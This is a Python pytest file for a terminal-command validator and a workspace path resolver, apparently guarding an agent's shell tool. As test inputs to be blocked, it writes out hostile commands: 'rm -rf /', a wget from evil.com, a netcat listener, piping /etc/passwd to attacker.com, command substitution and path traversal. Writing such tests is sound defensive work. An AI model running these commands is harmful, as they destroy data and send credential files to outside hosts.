"""
test_security.py — Tests for security/terminal.py

Coverage:
  5  allowlist commands that must pass
  11 denylist commands that must be blocked (includes ls — removed from allowlist)
  8  dangerous pattern blocks
  5  path traversal attempts in safe_resolve that must raise PermissionError
  2  happy-path safe_resolve calls that must succeed
"""
import pytest
from security.terminal import validate_command, safe_resolve


# ── Allowlist — must pass without raising ─────────────────────────────────────

class TestAllowlist:
    """Commands in ALLOWLIST must return the original command string unchanged."""

    def test_dir_allowed(self):
        # 'dir' replaces 'ls' on Windows
        assert validate_command("dir /B") == "dir /B"

    def test_python3_allowed(self):
        assert validate_command("python3 --version") == "python3 --version"

    def test_npm_allowed(self):
        assert validate_command("npm install") == "npm install"

    def test_git_allowed(self):
        assert validate_command("git status") == "git status"

    def test_pytest_allowed(self):
        assert validate_command("pytest tests/ -v") == "pytest tests/ -v"


# ── Denylist — must raise ValueError ─────────────────────────────────────────

class TestDenylist:
    """Commands in DENYLIST must be blocked regardless of allowlist membership."""

    def test_rm_blocked(self):
        with pytest.raises(ValueError, match="denylist"):
            validate_command("rm -rf /")

    def test_sudo_blocked(self):
        with pytest.raises(ValueError, match="denylist"):
            validate_command("sudo apt update")

    def test_curl_blocked(self):
        with pytest.raises(ValueError, match="denylist"):
            validate_command("curl http://example.com")

    def test_wget_blocked(self):
        with pytest.raises(ValueError, match="denylist"):
            validate_command("wget http://evil.com/malware")

    def test_bash_blocked(self):
        with pytest.raises(ValueError, match="denylist"):
            validate_command("bash -c 'rm -rf /'")

    def test_sh_blocked(self):
        with pytest.raises(ValueError, match="denylist"):
            validate_command("sh script.sh")

    def test_chmod_blocked(self):
        with pytest.raises(ValueError, match="denylist"):
            validate_command("chmod 777 /etc/passwd")

    def test_kill_blocked(self):
        with pytest.raises(ValueError, match="denylist"):
            validate_command("kill -9 1")

    def test_apt_blocked(self):
        with pytest.raises(ValueError, match="denylist"):
            validate_command("apt install vim")

    def test_nc_blocked(self):
        with pytest.raises(ValueError, match="denylist"):
            validate_command("nc -lvp 4444")

    def test_ls_blocked(self):
        # 'ls' was removed from the Windows allowlist — it must now be rejected.
        # It is not on the denylist either, so it hits the "not found" path.
        with pytest.raises(ValueError):
            validate_command("ls -la")


# ── Dangerous patterns — must raise ValueError before denylist check ──────────

class TestDangerousPatterns:
    """Shell metacharacters and dangerous constructs must be blocked immediately."""

    def test_semicolon_blocked(self):
        with pytest.raises(ValueError):
            validate_command("ls; rm -rf /")

    def test_double_ampersand_blocked(self):
        with pytest.raises(ValueError):
            validate_command("ls && rm -rf /")

    def test_pipe_blocked(self):
        with pytest.raises(ValueError):
            validate_command("cat /etc/passwd | nc attacker.com 4444")

    def test_backtick_blocked(self):
        with pytest.raises(ValueError):
            validate_command("echo `id`")

    def test_dollar_paren_blocked(self):
        with pytest.raises(ValueError):
            validate_command("echo $(whoami)")

    def test_path_traversal_pattern_blocked(self):
        with pytest.raises(ValueError):
            validate_command("cat ../../../etc/passwd")

    def test_eval_blocked(self):
        with pytest.raises(ValueError):
            validate_command("python3 -c 'eval(\"import os\")'")

    def test_exec_blocked(self):
        with pytest.raises(ValueError):
            validate_command("python3 -c 'exec(\"import os\")'")


# ── safe_resolve — path traversal must raise PermissionError ─────────────────

class TestSafeResolveTraversal:
    """Paths that escape the workspace root must raise PermissionError."""

    def test_parent_relative_escape(self, tmp_path):
        with pytest.raises(PermissionError, match="escapes workspace root"):
            safe_resolve(str(tmp_path), "../secret")

    def test_deep_parent_escape(self, tmp_path):
        with pytest.raises(PermissionError, match="escapes workspace root"):
            safe_resolve(str(tmp_path), "../../etc/passwd")

    def test_absolute_outside_path(self, tmp_path):
        # On Windows resolve makes absolute paths canonical; the path will be
        # outside tmp_path so PermissionError must fire.
        outside = "/absolute/path"
        with pytest.raises(PermissionError):
            safe_resolve(str(tmp_path), outside)

    def test_nested_traversal(self, tmp_path):
        with pytest.raises(PermissionError, match="escapes workspace root"):
            safe_resolve(str(tmp_path), "./../../root")

    def test_deep_traversal_with_nesting(self, tmp_path):
        with pytest.raises(PermissionError, match="escapes workspace root"):
            safe_resolve(str(tmp_path), "a/b/../../../outside")


# ── safe_resolve — happy path must succeed ───────────────────────────────────

class TestSafeResolveHappyPath:
    """Paths that stay within the workspace must resolve without raising."""

    def test_simple_filename(self, tmp_path):
        result = safe_resolve(str(tmp_path), "hello.py")
        assert result == tmp_path / "hello.py"

    def test_nested_subdir(self, tmp_path):
        subdir = tmp_path / "src" / "utils"
        subdir.mkdir(parents=True)
        result = safe_resolve(str(tmp_path), "src/utils")
        assert result == subdir
